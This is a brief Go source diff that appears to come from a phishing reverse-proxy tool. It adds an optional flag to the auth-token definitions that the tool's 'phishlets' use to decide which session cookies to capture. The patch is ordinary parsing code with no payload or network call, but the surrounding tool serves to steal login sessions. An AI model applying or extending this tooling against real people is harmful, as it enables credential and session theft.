@@ -32,6 +32,7 @@ type AuthToken struct {
 	name      string
 	re        *regexp.Regexp
 	http_only bool
+	optional  bool
 }
 
 type Phishlet struct {
@@ -308,6 +309,7 @@ func (p *Phishlet) addAuthTokens(hostname string, tokens []string) error {
 				name:      name,
 				re:        nil,
 				http_only: false,
+				optional:  false,
 			}
 			for i := 1; i < len(st); i++ {
 				switch st[i] {
@@ -317,6 +319,8 @@ func (p *Phishlet) addAuthTokens(hostname string, tokens []string) error {
 					if err != nil {
 						return err
 					}
+				case "opt":
+					at.optional = true
 				}
 			}
 			p.authTokens[hostname] = append(p.authTokens[hostname], at)
